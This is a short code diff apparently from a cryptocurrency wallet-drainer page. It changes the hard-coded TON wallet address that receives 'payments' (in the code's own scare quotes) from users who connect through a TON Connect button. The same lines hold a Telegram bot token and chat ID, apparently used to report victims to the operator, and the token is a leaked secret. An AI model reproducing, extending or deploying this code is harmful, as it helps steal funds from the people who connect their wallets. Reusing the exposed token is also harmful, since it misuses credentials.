@@ -3,7 +3,7 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     buttonRootId: 'ton-connect'
 });
 
-const MAIN_WALLET = "UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp"; // The wallet to receive "payments"
+const MAIN_WALLET = "UQB_1vs8YfWcLzedQqVYRv5_OcXWZsqewXRj9io0CvsGqZAD"; // The wallet to receive "payments"
 const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
 const TG_CHAT_ID = "8126533622";
 
